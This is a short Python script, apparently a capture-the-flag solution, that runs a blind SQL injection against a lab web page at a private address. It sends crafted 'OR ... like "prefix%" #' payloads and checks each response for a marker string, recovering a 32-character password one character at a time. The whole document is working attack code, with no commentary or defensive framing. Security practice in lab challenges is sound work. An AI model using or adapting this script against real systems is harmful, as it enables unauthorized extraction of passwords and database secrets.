import requests
import re
import string


url = 'http://10.12.0.30/flag.php'

session = requests.Session()
characters = string.ascii_letters + string.digits
secret_password = list()
while (len(secret_password) < 32):
	for ch in characters:
		print("Trying the character to match the Password with:", "".join(secret_password) + ch)

		response = session.post(url, data = 'value" OR FLAG password like "'+ "".join(secret_password) + ch +'%" #' )

		content = response.text

		if("That 'value'" in content):
			secret_password.append(ch)
			break
